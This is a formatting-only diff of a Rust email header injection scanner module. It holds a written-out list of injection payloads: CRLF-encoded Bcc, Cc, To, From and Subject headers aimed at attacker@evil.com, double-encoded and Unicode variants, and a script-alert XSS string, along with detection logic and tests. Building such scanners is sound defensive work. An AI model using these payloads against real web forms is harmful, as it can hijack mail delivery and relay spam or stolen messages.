@@ -25,21 +25,28 @@ impl EmailHeaderInjectionScanner {
     ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         // License check
         if !crate::license::verify_scan_authorized() {
-            return Err(anyhow::anyhow!("Scan not authorized. Please check your license."));
+            return Err(anyhow::anyhow!(
+                "Scan not authorized. Please check your license."
+            ));
         }
 
         // Smart parameter filtering - skip framework internals
         if ParameterFilter::should_skip_parameter(param_name, ScannerType::Other) {
-            debug!("[Email] Skipping framework/internal parameter: {}", param_name);
+            debug!(
+                "[Email] Skipping framework/internal parameter: {}",
+                param_name
+            );
             return Ok((Vec::new(), 0));
         }
 
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
 
-        info!("[Email] Testing email header injection on parameter: {} (priority: {})",
-              param_name,
-              ParameterFilter::get_parameter_priority(param_name));
+        info!(
+            "[Email] Testing email header injection on parameter: {} (priority: {})",
+            param_name,
+            ParameterFilter::get_parameter_priority(param_name)
+        );
 
         // Get baseline response with normal email
         let baseline_value = "test@example.com";
@@ -60,54 +67,105 @@ impl EmailHeaderInjectionScanner {
         // Test various email header injection payloads
         let payloads = vec![
             // BCC injection (URL encoded)
-            ("test@example.com%0d%0aBcc:attacker@evil.com", "BCC header injection (URL encoded)"),
-            ("test@example.com%0aBcc:attacker@evil.com", "BCC header injection (LF only)"),
-            ("test@example.com\r\nBcc:attacker@evil.com", "BCC header injection (literal CRLF)"),
-
+            (
+                "test@example.com%0d%0aBcc:attacker@evil.com",
+                "BCC header injection (URL encoded)",
+            ),
+            (
+                "test@example.com%0aBcc:attacker@evil.com",
+                "BCC header injection (LF only)",
+            ),
+            (
+                "test@example.com\r\nBcc:attacker@evil.com",
+                "BCC header injection (literal CRLF)",
+            ),
             // CC injection
-            ("test@example.com%0d%0aCc:attacker@evil.com", "CC header injection (URL encoded)"),
-            ("test@example.com%0aCc:attacker@evil.com", "CC header injection (LF only)"),
-            ("test@example.com\r\nCc:attacker@evil.com", "CC header injection (literal CRLF)"),
-
+            (
+                "test@example.com%0d%0aCc:attacker@evil.com",
+                "CC header injection (URL encoded)",
+            ),
+            (
+                "test@example.com%0aCc:attacker@evil.com",
+                "CC header injection (LF only)",
+            ),
+            (
+                "test@example.com\r\nCc:attacker@evil.com",
+                "CC header injection (literal CRLF)",
+            ),
             // To header injection
-            ("test@example.com%0d%0aTo:attacker@evil.com", "To header injection (URL encoded)"),
-            ("test@example.com%0aTo:attacker@evil.com", "To header injection (LF only)"),
-            ("test@example.com\r\nTo:attacker@evil.com", "To header injection (literal CRLF)"),
-
+            (
+                "test@example.com%0d%0aTo:attacker@evil.com",
+                "To header injection (URL encoded)",
+            ),
+            (
+                "test@example.com%0aTo:attacker@evil.com",
+                "To header injection (LF only)",
+            ),
+            (
+                "test@example.com\r\nTo:attacker@evil.com",
+                "To header injection (literal CRLF)",
+            ),
             // Subject injection
-            ("test@example.com%0d%0aSubject:Injected Subject", "Subject header injection"),
-            ("test@example.com%0aSubject:Spam%20Message", "Subject injection (LF)"),
-
+            (
+                "test@example.com%0d%0aSubject:Injected Subject",
+                "Subject header injection",
+            ),
+            (
+                "test@example.com%0aSubject:Spam%20Message",
+                "Subject injection (LF)",
+            ),
             // Reply-To injection
-            ("test@example.com%0d%0aReply-To:attacker@evil.com", "Reply-To header injection"),
-
+            (
+                "test@example.com%0d%0aReply-To:attacker@evil.com",
+                "Reply-To header injection",
+            ),
             // From header injection
-            ("test@example.com%0d%0aFrom:attacker@evil.com", "From header injection"),
-
+            (
+                "test@example.com%0d%0aFrom:attacker@evil.com",
+                "From header injection",
+            ),
             // Content-Type injection (email body manipulation)
-            ("test@example.com%0d%0aContent-Type:text/html", "Content-Type header injection"),
-            ("test@example.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
-             "Content-Type with XSS payload"),
-            ("test@example.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Injected HTML</h1>",
-             "Content-Type with HTML injection"),
-
+            (
+                "test@example.com%0d%0aContent-Type:text/html",
+                "Content-Type header injection",
+            ),
+            (
+                "test@example.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
+                "Content-Type with XSS payload",
+            ),
+            (
+                "test@example.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Injected HTML</h1>",
+                "Content-Type with HTML injection",
+            ),
             // Multiple headers
-            ("test@example.com%0d%0aBcc:attacker@evil.com%0d%0aSubject:Injected",
-             "Multiple header injection (BCC + Subject)"),
-            ("test@example.com%0aBcc:attacker@evil.com%0aCc:spam@evil.com",
-             "Multiple recipient injection"),
-
+            (
+                "test@example.com%0d%0aBcc:attacker@evil.com%0d%0aSubject:Injected",
+                "Multiple header injection (BCC + Subject)",
+            ),
+            (
+                "test@example.com%0aBcc:attacker@evil.com%0aCc:spam@evil.com",
+                "Multiple recipient injection",
+            ),
             // Double encoding attempts
-            ("test@example.com%250d%250aBcc:attacker@evil.com", "BCC injection (double encoded)"),
-
+            (
+                "test@example.com%250d%250aBcc:attacker@evil.com",
+                "BCC injection (double encoded)",
+            ),
             // Unicode variants
-            ("test@example.com%E5%98%8A%E5%98%8DBcc:attacker@evil.com", "BCC injection (Unicode CRLF)"),
-
+            (
+                "test@example.com%E5%98%8A%E5%98%8DBcc:attacker@evil.com",
+                "BCC injection (Unicode CRLF)",
+            ),
             // Null byte variants
-            ("test@example.com%00%0d%0aBcc:attacker@evil.com", "BCC injection (null byte + CRLF)"),
-
+            (
+                "test@example.com%00%0d%0aBcc:attacker@evil.com",
+                "BCC injection (null byte + CRLF)",
+            ),
             // Body injection via double CRLF
-            ("test@example.com%0d%0a%0d%0aInjected email body content", "Email body injection"),
+            (
+                "test@example.com%0d%0a%0d%0aInjected email body content",
+                "Email body injection",
+            ),
         ];
 
         for (payload, description) in payloads {
@@ -122,7 +180,8 @@ impl EmailHeaderInjectionScanner {
             match self.http_client.get(&test_url).await {
                 Ok(response) => {
                     // Convert HashMap headers to Vec of tuples
-                    let headers_vec: Vec<(String, String)> = response.headers
+                    let headers_vec: Vec<(String, String)> = response
+                        .headers
                         .iter()
                         .map(|(k, v)| (k.clone(), v.clone()))
                         .collect();
@@ -135,7 +194,10 @@ impl EmailHeaderInjectionScanner {
                         &test_url,
                         param_name,
                     ) {
-                        info!("Email header injection vulnerability detected: {}", description);
+                        info!(
+                            "Email header injection vulnerability detected: {}",
+                            description
+                        );
                         vulnerabilities.push(vuln);
                         break; // Found vulnerability, move to next parameter
                     }
@@ -160,7 +222,9 @@ impl EmailHeaderInjectionScanner {
     ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         // License check
         if !crate::license::verify_scan_authorized() {
-            return Err(anyhow::anyhow!("Scan not authorized. Please check your license."));
+            return Err(anyhow::anyhow!(
+                "Scan not authorized. Please check your license."
+            ));
         }
 
         // First, check if this site has email functionality by fetching the page
@@ -170,19 +234,20 @@ impl EmailHeaderInjectionScanner {
                 let body_lower = response.body.to_lowercase();
 
                 // Check for evidence of email functionality
-                let has_contact_form = body_lower.contains("contact") &&
-                    (body_lower.contains("<form") || body_lower.contains("action="));
-                let has_email_form = body_lower.contains("email") &&
-                    body_lower.contains("<form") &&
-                    (body_lower.contains("type=\"email\"") || body_lower.contains("type='email'"));
-                let has_mail_endpoint = body_lower.contains("/mail") ||
-                    body_lower.contains("/contact") ||
-                    body_lower.contains("/send") ||
-                    body_lower.contains("/subscribe") ||
-                    body_lower.contains("mailto:");
-                let has_smtp_hints = body_lower.contains("smtp") ||
-                    body_lower.contains("sendmail") ||
-                    body_lower.contains("phpmailer");
+                let has_contact_form = body_lower.contains("contact")
+                    && (body_lower.contains("<form") || body_lower.contains("action="));
+                let has_email_form = body_lower.contains("email")
+                    && body_lower.contains("<form")
+                    && (body_lower.contains("type=\"email\"")
+                        || body_lower.contains("type='email'"));
+                let has_mail_endpoint = body_lower.contains("/mail")
+                    || body_lower.contains("/contact")
+                    || body_lower.contains("/send")
+                    || body_lower.contains("/subscribe")
+                    || body_lower.contains("mailto:");
+                let has_smtp_hints = body_lower.contains("smtp")
+                    || body_lower.contains("sendmail")
+                    || body_lower.contains("phpmailer");
 
                 has_contact_form || has_email_form || has_mail_endpoint || has_smtp_hints
             }
@@ -192,7 +257,10 @@ impl EmailHeaderInjectionScanner {
         // If no email functionality detected, skip this scanner entirely
         // This prevents false positives on static sites, SPAs without email features, etc.
         if !has_email_functionality {
-            debug!("No email functionality detected on {}, skipping email header injection scan", url);
+            debug!(
+                "No email functionality detected on {}, skipping email header injection scan",
+                url
+            );
             return Ok((Vec::new(), 1)); // 1 test = the initial check
         }
 
@@ -258,7 +326,9 @@ impl EmailHeaderInjectionScanner {
         ];
 
         for indicator in &error_indicators {
-            if body_lower.contains(indicator) && (body_lower.contains("error") || body_lower.contains("invalid")) {
+            if body_lower.contains(indicator)
+                && (body_lower.contains("error") || body_lower.contains("invalid"))
+            {
                 // Compare with baseline to see if this is a different error
                 if let Some(baseline) = baseline_response {
                     if !baseline.body.to_lowercase().contains(indicator) {
@@ -311,7 +381,8 @@ impl EmailHeaderInjectionScanner {
                     } else if let Some(baseline) = baseline_response {
                         // Check if response differs significantly from baseline
                         let size_diff = (body.len() as i64 - baseline.body.len() as i64).abs();
-                        if size_diff > 50 { // Significant size difference
+                        if size_diff > 50 {
+                            // Significant size difference
                             return Some(self.create_vulnerability(
                                 url,
                                 param_name,
@@ -331,7 +402,8 @@ impl EmailHeaderInjectionScanner {
             // Look for literal CRLF in body
             if body.contains("\r\n") && body.contains("Bcc:")
                 || body.contains("\r\n") && body.contains("Cc:")
-                || body.contains("\r\n") && body.contains("Subject:") {
+                || body.contains("\r\n") && body.contains("Subject:")
+            {
                 return Some(self.create_vulnerability(
                     url,
                     param_name,
@@ -367,7 +439,9 @@ impl EmailHeaderInjectionScanner {
         // Check for Content-Type injection with HTML/script content
         // IMPORTANT: Only flag if our EXACT injected script appears, not just any <script> tag
         // Normal websites have <script> tags - that's not a vulnerability!
-        if payload.contains("<script>alert(1)</script>") && body.contains("<script>alert(1)</script>") {
+        if payload.contains("<script>alert(1)</script>")
+            && body.contains("<script>alert(1)</script>")
+        {
             // Also verify that the payload was actually processed (not just in a static page)
             // Check if this is NOT a normal HTML page that would already have scripts
             if !body.contains("<!DOCTYPE") && !body.contains("<html") {
@@ -401,13 +475,17 @@ impl EmailHeaderInjectionScanner {
 
             // Check if email-related headers were set
             if (key_lower == "x-mailer" || key_lower.contains("mail") || key_lower.contains("smtp"))
-                && (value_lower.contains("bcc") || value_lower.contains("attacker")) {
+                && (value_lower.contains("bcc") || value_lower.contains("attacker"))
+            {
                 return Some(self.create_vulnerability(
                     url,
                     param_name,
                     payload,
                     "Email header injection - Mail-related response headers",
-                    &format!("Suspicious mail-related header detected: {}: {}", key, value),
+                    &format!(
+                        "Suspicious mail-related header detected: {}: {}",
+                        key, value
+                    ),
                     Confidence::Medium,
                 ));
             }
@@ -485,7 +563,7 @@ mod uuid {
 mod tests {
     use super::*;
     use crate::detection_helpers::AppCharacteristics;
-use crate::http_client::HttpClient;
+    use crate::http_client::HttpClient;
     use std::sync::Arc;
 
     fn create_test_scanner() -> EmailHeaderInjectionScanner {
@@ -589,9 +667,7 @@ use crate::http_client::HttpClient;
         let scanner = create_test_scanner();
 
         let body = "Normal email form page";
-        let headers = vec![
-            ("Content-Type".to_string(), "text/html".to_string()),
-        ];
+        let headers = vec![("Content-Type".to_string(), "text/html".to_string())];
 
         let result = scanner.analyze_response(
             body,
